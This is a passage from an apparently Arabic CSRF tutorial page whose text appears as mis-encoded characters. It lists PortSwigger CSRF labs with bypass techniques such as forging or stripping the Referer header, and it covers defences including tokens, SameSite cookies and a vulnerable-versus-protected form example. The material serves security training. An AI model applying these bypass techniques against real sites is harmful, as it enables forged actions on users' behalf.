            <h3>๐๏ธ ูุฎุชุจุฑุงุช Blind CSRF</h3>
            <div class="lab-card">
                <h4>๐งช Lab 5: CSRF where token is duplicated in cookie</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู CSRF ุฃุนูู</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุงุณุชุฎุฏุงู token ูู ุงูู cookie</p>
                <a href="https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <h3>๐ก๏ธ ูุฎุชุจุฑุงุช ุงูุญูุงูุฉ ุงููุชูุฏูุฉ</h3>
            <div class="lab-card">
                <h4>๐งช Lab 6: CSRF where Referer validation depends on header being present</h4>
                <p><strong>ุงููุฏู:</strong> ุชุฎุทู ุญูุงูุฉ Referer</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุฅุฒุงูุฉ ุฃู ุชุฒููุฑ Referer header</p>
                <a href="https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <div class="lab-card">
                <h4>๐งช Lab 7: CSRF with broken Referer validation</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู ุญูุงูุฉ Referer ุถุนููุฉ</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุชุฒููุฑ Referer header</p>
                <a href="https://portswigger.net/web-security/csrf/lab-broken-referer-validation" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <div class="lab-card">
                <h4>๐งช Lab 8: CSRF where token validation depends on parsing method</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู ุทุฑููุฉ ุชุญููู ุงูู token</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุชุฎุทู ุทุฑููุฉ ุงูุชุญูู ูู ุงูู token</p>
                <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-parsing-method" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <div class="tip">
                <h4>๐ก ูุตุงุฆุญ ูุญู ุงููุฎุชุจุฑุงุช</h4>
                <ul class="list">
                    <li><strong>ุงููู ููุน ุงููุฌูู:</strong> ูู ูุฎุชุจุฑ ูุฑูุฒ ุนูู ููุน ูุญุฏุฏ ูู CSRF</li>
                    <li><strong>ุงุณุชุฎุฏู Burp Suite:</strong> ูุชุญููู ุงูุทูุจุงุช ูุงูุฑุฏูุฏ</li>
                    <li><strong>ูุญุต ุงูุญูุงูุฉ:</strong> ุงุจุญุซ ุนู CSRF tokensุ Referer validation</li>
                    <li><strong>ุงุณุชุฎุฏู Browser DevTools:</strong> ููุฑุงูุจุฉ ุงูุทูุจุงุช</li>
                    <li><strong>ุงุฎุชุจุฑ ุชุฏุฑูุฌูุงู:</strong> ุงุจุฏุฃ ุจุงุฎุชุจุงุฑุงุช ุจุณูุทุฉ ุซู ุชุทูุฑ</li>
                    <li><strong>ุงููู ุงูุณูุงู:</strong> ูุง ูู ุงูุฅุฌุฑุงุกุงุช ุงูุญุณุงุณุฉุ</li>
                </ul>
            </div>
        </section>

        <section id="defense">
            <h2><i class="fas fa-shield-halved"></i> ุทุฑู ุงูุญูุงูุฉ ูู ูุฌูุงุช CSRF</h2>
            
            <div class="grid">
                <div class="card">
                    <h3>๐ 1. CSRF Tokens</h3>
                    <ul class="list">
                        <li>ุฅุถุงูุฉ token ูุฑูุฏ ููู ุทูุจ</li>
                        <li>ุงูุชุญูู ูู ุตุญุฉ ุงูู token</li>
                        <li>ุฑุจุท ุงูู token ุจุงูุฌูุณุฉ</li>
                        <li>ุชุญุฏูุซ ุงูู token ุจุนุฏ ูู ุทูุจ</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>๐ช 2. SameSite Cookies</h3>
                    <ul class="list">
                        <li>ุงุณุชุฎุฏุงู SameSite=Strict</li>
                        <li>ููุน ุฅุฑุณุงู cookies ุนุจุฑ ุงูููุงูุน</li>
                        <li>ุชุทุจูู ุณูุงุณุงุช ุตุงุฑูุฉ</li>
                        <li>ูุฑุงูุจุฉ ุณููู ุงูู cookies</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>๐ 3. Referer Validation</h3>
                    <ul class="list">
                        <li>ุงูุชุญูู ูู Referer header</li>
                        <li>ููุงุฑูุฉ ุงููุทุงู</li>
                        <li>ุฑูุถ ุงูุทูุจุงุช ุงููุดุจููุฉ</li>
                        <li>ุชุทุจูู ูุงุฆูุฉ ุจูุถุงุก ูููุทุงูุงุช</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>๐ก๏ธ 4. Double Submit Cookie</h3>
                    <ul class="list">
                        <li>ุฅุฑุณุงู token ูู ุงูู cookie ูุงูู form</li>
                        <li>ููุงุฑูุฉ ุงููููุชูู</li>
                        <li>ุฑูุถ ุงูุทูุจุงุช ุบูุฑ ุงููุชุทุงุจูุฉ</li>
                        <li>ุชุทุจูู ุชุดููุฑ ููู</li>
                    </ul>
                </div>
            </div>

            <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู: ุญูุงูุฉ ูู CSRF</span>
<pre><code>// โ ููุฏ ุถุนูู
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="text" name="amount"&gt;
    &lt;input type="text" name="to"&gt;
    &lt;input type="submit" value="ุชุญููู"&gt;
&lt;/form&gt;

// โ ููุฏ ุขูู
&lt;form action="/transfer" method="POST"&gt;
    &lt;input type="text" name="amount"&gt;
    &lt;input type="text" name="to"&gt;
    &lt;input type="hidden" name="csrf_token" value="&lt;?php echo generateCSRFToken(); ?&gt;"&gt;
    &lt;input type="submit" value="ุชุญููู"&gt;
&lt;/form&gt;

// ุงูุชุญูู ูู ุงูู token
if (!validateCSRFToken($_POST['csrf_token'])) {
    die('CSRF token invalid');
}</code></pre>
            </div>
        </section>

        <section id="summary">
            <h2><i class="fas fa-list-check"></i> ุงูุฎูุงุตุฉ</h2>
            
            <p>ูุฌูุงุช CSRF ูู ุซุบุฑุงุช ุฎุทูุฑุฉ ุชุณูุญ ููููุงุฌููู ุจุชูููุฐ ุฅุฌุฑุงุกุงุช ููุงุจุฉ ุนู ุงููุณุชุฎุฏููู ุงููุตุงุฏููู. ููู ุฃููุงุนูุง ุงููุฎุชููุฉ ูููููุฉ ุงูุชุดุงููุง ูุงุณุชุบูุงููุง ุถุฑูุฑู ููุญูุงูุฉ ุงููุนุงูุฉ. ุชุทุจูู ููุงุฑุณุงุช ุงูุญูุงูุฉ ุงูุตุญูุญุฉ ูุซู CSRF tokens ูSameSite cookies ูุณุงุนุฏ ูู ููุน ูุฐู ุงููุฌูุงุช.</p>

            <div class="tip">
                <h4>๐ฏ ุงูููุงุท ุงูุฑุฆูุณูุฉ</h4>
                <ul class="list">
                    <li>ูุฌูุงุช CSRF ุชุณุชุบู ุซูุฉ ุงููููุน ุจุงููุชุตูุญ</li>
                    <li>ููุงู 5 ุฃููุงุน ุฑุฆูุณูุฉ ูู ูุฌูุงุช CSRF</li>
                    <li>ุงูุงูุชุดุงู ูุชุทูุจ ูุญุต ุฏููู ููุญูุงูุฉ</li>
                    <li>ุงูุญูุงูุฉ ุชุชุทูุจ ุชุทุจูู CSRF tokens ูSameSite cookies</li>
                    <li>ุงูุงุฎุชุจุงุฑ ุงูููุชุธู ุถุฑูุฑู ููุญูุงูุฉ ุงููุนุงูุฉ</li>
                </ul>
            </div>
        </section>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({
            startOnLoad: true,
            theme: 'dark',
            themeVariables: {
                primaryColor: '#42a5f5',
                primaryTextColor: '#e8eaed',
                primaryBorderColor: '#2d3748',
                lineColor: '#81c784',
                secondaryColor: '#1a2332',
                tertiaryColor: '#0f1724',
                background: '#1a2332',
                mainBkg: '#1a2332',
                secondBkg: '#0f1724',
                tertiaryBkg: '#2d3748',
                nodeBorder: '#2d3748',
                clusterBkg: '#0f1724',
                clusterBorder: '#2d3748',
                defaultLinkColor: '#81c784',
                titleColor: '#e8eaed',
                edgeLabelBackground: '#1a2332',
                nodeTextColor: '#e8eaed',
                textColor: '#e8eaed',
                actorTextColor: '#e8eaed',
                labelTextColor: '#e8eaed',
                loopTextColor: '#e8eaed',
                activationTextColor: '#e8eaed',
                sectionBkgColor: '#1a2332',
                altSectionBkgColor: '#0f1724',
                gridColor: '#2d3748',
                c0: '#42a5f5',
                c1: '#81c784',
                c2: '#ff9800',
                c3: '#e91e63'
            }
        });
    </script>
</body>
</html> 